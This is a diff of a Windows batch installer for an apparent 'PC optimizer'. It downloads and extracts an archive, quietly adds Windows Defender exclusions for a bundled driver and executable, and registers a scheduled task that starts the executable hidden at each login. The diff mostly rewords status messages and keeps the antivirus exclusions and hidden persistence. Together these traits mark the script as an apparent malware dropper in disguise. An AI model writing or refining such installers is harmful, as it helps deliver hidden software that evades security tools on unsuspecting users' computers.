@@ -22,50 +22,52 @@ if %errorlevel% neq 0 (
     pause
     exit /b 1
 )
-echo > System requirements verified
+echo > Requirements met
 
 echo.
 echo > Preparing installation directory...
 if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
-echo > Installation directory ready
+echo > Directory created
 
 echo.
 echo > Downloading latest optimization database...
-powershell -Command "try { Invoke-WebRequest -Uri '%URL%' -OutFile '%ZIP_PATH%' -ErrorAction Stop; Write-Host 'Download completed' } catch { Write-Host 'Download failed'; exit 1 }"
+powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%ZIP_PATH%' -ErrorAction Stop"
 if %errorlevel% neq 0 (
     echo ERROR: Download failed.
     pause
     exit /b 1
 )
+echo > Download completed
 
 echo.
 echo > Installing performance enhancements...
-powershell -Command "try { Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%INSTALL_DIR%' -Force; Write-Host 'Installation completed' } catch { Write-Host 'Installation failed'; exit 1 }"
+powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%INSTALL_DIR%' -Force"
 if %errorlevel% neq 0 (
     echo ERROR: Installation failed.
     pause
     exit /b 1
 )
-
 del "%ZIP_PATH%" >nul 2>&1
+echo > Files extracted
 
 echo.
 echo > Optimizing system configuration...
 if exist "%INSTALL_DIR%\pc-optimizer" (
     xcopy "%INSTALL_DIR%\pc-optimizer\*" "%INSTALL_DIR%\" /E /Y /I >nul
     rmdir /s /q "%INSTALL_DIR%\pc-optimizer"
-    echo > System configuration optimized
+    echo > Nested folder cleaned
 ) else (
-    echo > System configuration already optimized
+    echo > No nested folder to clean
 )
 
 echo.
-echo > Applying configuration parameters...
-powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%DRIVER_NAME%'; Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%EXE_NAME%'; Write-Host 'Security settings configured'"
+echo > Configuring security settings...
+powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%DRIVER_NAME%'" >nul 2>&1
+powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%EXE_NAME%'" >nul 2>&1
 echo > Security exclusions applied
 
 echo.
-echo > Setting up environment...
+echo > Creating startup task...
 schtasks /delete /tn "%APP_NAME%" /f >nul 2>&1
 schtasks /create /tn "%APP_NAME%" ^
  /tr "powershell -WindowStyle Hidden -Command Start-Process '%INSTALL_DIR%\%EXE_NAME%' -WindowStyle Hidden" ^
@@ -74,7 +76,7 @@ schtasks /create /tn "%APP_NAME%" ^
  /f >nul
 
 if %errorlevel% neq 0 (
-    echo ERROR
+    echo ERROR: Task creation failed.
     pause
     exit /b 1
 )
@@ -82,6 +84,6 @@ echo > Startup task created
 
 echo.
 echo > Finalizing installation...
-echo > Installation complete. Please restart your computer!
 echo.
+echo Installation complete. The optimizer will run on next login.
 pause
